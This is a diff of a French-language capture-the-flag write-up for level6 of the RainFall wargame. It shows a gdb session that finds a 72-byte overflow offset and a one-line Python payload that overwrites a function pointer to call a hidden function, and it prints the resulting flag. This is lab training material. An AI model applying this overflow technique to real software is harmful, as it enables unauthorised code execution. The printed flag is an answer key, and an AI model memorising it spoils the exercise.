@@ -59,11 +59,13 @@ End of assembler dump.
 
 
 commencons par voir si on ne peut pas overflow tout ca:
-(gdb) r `python -c "print('\x90' * 72 + 'ABCD')"`
-Program received signal SIGSEGV, Segmentation fault.
-0x44434241 in ?? ()
+(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4A
 
-parfait, on sait donc qu'apres 72 chars on peut faire mumuse et lui demander de run la fonction 'n'
+Program received signal SIGSEGV, Segmentation fault.
+0x41346341 in ?? ()
+-> 72
+
+parfait, on sait donc qu'apres 72 chars on peut faire mumuse en changant l'adresse du pointeur sur fonction de 'm' par 'n'
 level6@RainFall:~$ ./level6 `python -c "print('\x90' * 72 + '\x08\x04\x84\x54'[::-1])"`
 f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
 
